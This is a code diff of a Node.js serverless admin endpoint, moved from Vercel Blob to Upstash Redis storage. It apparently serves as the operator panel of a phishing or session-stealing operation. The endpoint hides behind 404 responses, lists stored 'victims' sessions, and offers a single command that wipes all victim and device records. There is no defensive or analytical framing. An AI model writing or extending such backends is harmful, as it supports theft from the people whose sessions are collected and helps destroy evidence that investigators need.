@@ -1,39 +1,21 @@
 const crypto = require('crypto');
-const { list, del, get } = require('@vercel/blob');
+const { Redis } = require('@upstash/redis');
+const kv = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || 'https://invalid.upstash.io',
+  token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || 'invalid'
+});
 
 module.exports = async function handler(req, res) {
   const adminPass = process.env.ADMIN_PASSWORD;
-  if (!adminPass) {
-    return res.status(404).end();
-  }
-  if (!verify(req, adminPass)) {
-    return res.status(404).end();
-  }
+  if (!adminPass) return res.status(404).end();
+  if (!verify(req, adminPass)) return res.status(404).end();
 
   if (req.method === 'GET') {
-    let blobs = [];
-    try {
-      let cursor;
-      do {
-        const r = await list({ prefix: 'victims/', cursor });
-        blobs = blobs.concat(r.blobs || []);
-        cursor = r.cursor;
-      } while (cursor);
-    } catch (e) {
-      console.error('DV_LIST_ERR', e && (e.stack || e.message || e));
-      blobs = [];
-    }
-
+    let all = {};
+    try { all = (await kv.hgetall('pv:victims')) || {}; } catch (e) { console.error('DV_LIST_ERR', e && (e.message || e)); all = {}; }
     const sessions = [];
-    for (const b of blobs) {
-      try {
-        const r = await get(b.pathname, { access: 'private', useCache: false });
-        if (!r) continue;
-        const text = await new Response(r.stream).text();
-        sessions.push(JSON.parse(text));
-      } catch (e) {
-        console.error('DV_GET_ERR', b.pathname, e && (e.message || e));
-      }
+    for (const v of Object.values(all)) {
+      try { sessions.push(typeof v === 'string' ? JSON.parse(v) : v); } catch (e) {}
     }
     sessions.sort((a, b) => String(b.ts || b.t || '').localeCompare(String(a.ts || a.t || '')));
     return res.status(200).json({ sessions: sessions, count: sessions.length });
@@ -43,22 +25,9 @@ module.exports = async function handler(req, res) {
     const body = req.body || {};
     if (body.f === 1) {
       try {
-        let cursor;
-        const paths = [];
-        do {
-          const r = await list({ prefix: 'victims/', cursor });
-          (r.blobs || []).forEach(b => paths.push(b.pathname));
-          cursor = r.cursor;
-        } while (cursor);
-        if (paths.length) await del(paths);
-        const devKeys = [];
-        let dc;
-        do {
-          const r2 = await list({ prefix: 'dev/', cursor: dc });
-          (r2.blobs || []).forEach(b => devKeys.push(b.pathname));
-          dc = r2.cursor;
-        } while (dc);
-        if (devKeys.length) await del(devKeys);
+        await kv.del('pv:victims');
+        const devKeys = await kv.keys('pv:dev:*');
+        if (devKeys && devKeys.length) await kv.del(...devKeys);
       } catch (e) {}
       return res.status(200).json({ ok: 1 });
     }
@@ -75,9 +44,5 @@ function verify(req, secret) {
   const exp = Number(m[1]);
   if (!exp || exp * 1000 < Date.now()) return false;
   const expect = crypto.createHmac('sha256', secret).update(String(exp)).digest('hex');
-  try {
-    return crypto.timingSafeEqual(Buffer.from(m[2], 'hex'), Buffer.from(expect, 'hex'));
-  } catch (e) {
-    return false;
-  }
+  try { return crypto.timingSafeEqual(Buffer.from(m[2], 'hex'), Buffer.from(expect, 'hex')); } catch (e) { return false; }
 }
